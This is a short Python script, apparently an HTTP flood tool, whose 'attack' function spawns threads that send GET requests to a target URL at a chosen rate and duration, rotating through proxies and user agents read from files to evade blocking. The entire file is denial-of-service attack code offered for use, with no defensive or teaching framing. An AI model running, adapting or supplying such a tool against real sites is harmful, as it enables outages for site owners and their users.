import requests
import threading
import time
import random
import sys
import socket

def attack(url, duration, rps, thread):
    with open("proxstars.txt", "r") as proxy_file:
        proxies = proxy_file.read().splitlines()
    with open("uastaro.txt", "r") as ua_file:
        user_agents = ua_file.read().splitlines()

    def attack_thread():
        delay = 1 / rps
        start_time = time.time()
        while time.time() < start_time + duration:
            proxy = random.choice(proxies)
            user_agent = random.choice(user_agents)
            try:
                with socket.create_connection((proxy, 80)) as s:
                    headers = {
                        "User-Agent": user_agent,
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Referer": url,
                        "Connection": "keep-alive",
                        "Cache-Control": "no-cache",
                        "Cookie": "overpower=true",
                        "X-Overpower": "true"
                    }
                    request = f"GET {url} HTTP/1.1\r\nHost: {proxy}\r\n"
                    for header, value in headers.items():
                        request += f"{header}: {value}\r\n"
                    request += "\r\n"
                    s.sendall(request.encode())
            except Exception as e:
                print(f"An error occurred: {e}")
            time.sleep(delay)

    threads = []
    for _ in range(thread):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        threads.append(t)

    for t in threads:
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python script.py <url> <duration> <rps> <thread>")
        sys.exit(1)
    url = sys.argv[1]
    duration = int(sys.argv[2])
    rps = int(sys.argv[3])
    thread = int(sys.argv[4])
    attack(url, duration, rps, thread)